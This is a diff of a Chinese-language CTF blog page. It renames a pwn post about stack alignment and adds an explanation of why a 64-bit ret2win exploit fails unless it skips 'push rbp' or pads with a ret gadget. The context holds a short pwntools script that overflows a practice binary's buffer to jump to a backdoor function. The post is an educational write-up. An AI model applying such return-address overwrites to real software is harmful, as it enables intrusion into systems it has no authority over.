@@ -21,8 +21,8 @@
   
     <meta name="description" content="pwn的坑之堆栈平衡今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwn-Question">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/19/Questions/Pwn-Question/index.html">
+<meta property="og:title" content="堆栈平衡问题">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/index.html">
 <meta property="og:site_name" content="0x4A">
 <meta property="og:description" content="pwn的坑之堆栈平衡今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日">
 <meta property="og:locale" content="en_US">
@@ -40,13 +40,13 @@
 <meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/debug3.png">
 <meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/fail.png">
 <meta property="article:published_time" content="2025-07-19T12:59:21.000Z">
-<meta property="article:modified_time" content="2025-07-21T06:04:01.384Z">
+<meta property="article:modified_time" content="2025-07-26T01:44:24.151Z">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/ctfshow-pwn02-main.png">
   
   
   
-  <title>Pwn-Question - 0x4A</title>
+  <title>堆栈平衡问题 - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Pwn-Question"></span>
+            <span id="subtitle" data-typed-text="堆栈平衡问题"></span>
           
         </div>
 
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          975 words
+          1k words
         
       </span>
     
@@ -271,7 +271,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Pwn-Question</h1>
+            <h1 id="seo-header">堆栈平衡问题</h1>
             
             
               <div class="markdown-body">
@@ -286,7 +286,7 @@
 <p>但是，离谱的事情出现了，每次在interactive以后都会收到EOF<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fail.png" srcset="/img/loading.gif" lazyload><br>然后，如果改成下面这样的利用脚本，就没有问题<br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401187</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
 <p>是的，仅仅是返回地址+1，后面又陆续尝试了别的返回地址，发现只要跳过fun函数的第一条指令，即push rbp，就可以<br><br>博主大感震撼并表示不理解，遂尝试gdb单步调试，看看到底怎么个事儿<br><br>从下面这张图可以明显看到rsp指向了我们要的0x401186，按道理ret指令结束后一定是去执行fun函数<br><br><img src="/../../photos/Questions/Pwn-Q1/debug1.png" srcset="/img/loading.gif" lazyload><br>并且接着si调试，可以看到，甚至它真的进到fun函数里面了<br><br><img src="/../../photos/Questions/Pwn-Q1/debug2.png" srcset="/img/loading.gif" lazyload><br>然后call system这里下个断点，可以正常执行完call指令前的所有指令<br><br><img src="/../../photos/Questions/Pwn-Q1/debug3.png" srcset="/img/loading.gif" lazyload><br>但是，最离谱的是，现在，在call system这里按下c键，让它继续执行，直接就崩溃<br><img src="/../../photos/Questions/Pwn-Q1/fail.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>这下博主彻底懵逼，这两个程序按道理完全一样的，只是改了下偏移和后门函数地址<br><br>唯二个人感觉可以算的上区别的：ctfshow的题目是32位，BUUCTF是64位；以及ctfshow的溢出点在pwnme函数，不在主函数，而BUUCTF的溢出点在主函数<br><br>在网上一番搜索无果，只找到一篇博客提到是堆栈平衡的缘故<br><br>可惜，截止目前依然不知道为什么BUUCTF这题一定要跳过push rbp的指令，只能先把问题记录下来…………</p>
+<h2 id="目前的理解"><a href="#目前的理解" class="headerlink" title="目前的理解"></a>目前的理解</h2><p>在网上搜索一番后，得知是堆栈平衡问题，在64位程序下，需要堆栈进行16位对齐，可以采用填充ret指令的方法<br><br>对于上述第二题，为什么必须要跳过push rbp指令，是因为push操作会破坏已经构造好的堆栈寄存器，所以不能劫持到0x401186<br><br>而由于第一题是32位，不存在堆栈平衡问题，所以可以按照上述方法打通<br><br>总结一下，做题时遇到莫名其妙的EOF，考虑避免劫持到带有push rbp指令的地址，如果还不行，考虑用ret指令填充到16的倍数<br></p>
 
                 
               </div>
@@ -332,8 +332,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Pwn-Question</div>
-      <div>http://0x4a-210.github.io/2025/07/19/Questions/Pwn-Question/</div>
+      <div>堆栈平衡问题</div>
+      <div>http://0x4a-210.github.io/2025/07/19/Questions/堆栈平衡问题/</div>
     </div>
     <div class="license-meta">
       
